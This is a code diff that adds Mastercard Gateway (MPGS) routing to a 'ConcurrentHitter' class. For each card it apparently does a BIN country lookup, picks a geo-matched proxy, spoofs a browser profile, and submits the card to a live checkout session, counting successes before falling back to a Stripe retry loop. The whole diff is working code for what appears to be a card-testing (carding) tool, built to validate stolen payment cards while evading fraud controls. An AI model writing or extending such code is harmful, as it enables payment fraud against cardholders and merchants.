@@ -2045,6 +2045,32 @@ class ConcurrentHitter:
                 max_retries = 2
                 bin_info = await BINLookup.lookup(card['card'])
                 bin_country = bin_info.get('country', '')
+                
+                # --- GATEWAY ROUTING ---
+                if "gateway.mastercard.com/checkout/pay/SESSION" in self.url:
+                    from mpgs_engine.mpgs_hitter import MPGSHitter
+                    proxy_data = await ProxyManager.get_geo_matched(self.user_id, bin_country) if bin_country else await ProxyManager.get_random(self.user_id)
+                    profile = BROWSER_PROFILES.get("android_chrome", BROWSER_PROFILES["chrome"])
+                    result = await MPGSHitter.process_card(self.url, card, proxy_data, profile)
+                    
+                    if not result.get("success"):
+                        self.fails += 1
+                    else:
+                        self.successes += 1
+                        
+                    if self.update_callback:
+                        await self.update_callback({
+                            "status": "progress",
+                            "result": result,
+                            "completed": self.completed,
+                            "total": self.total,
+                            "successes": self.successes,
+                            "fails": self.fails
+                        })
+                    if result.get('success') or result.get('session_expired'):
+                        self.is_running = False
+                    continue # Skip the Stripe retry loop below
+
                 for try_idx in range(max_retries):
                     # --- Fresh session per card for reusable links ---
                     cs_token = self.url_info['cs_token']
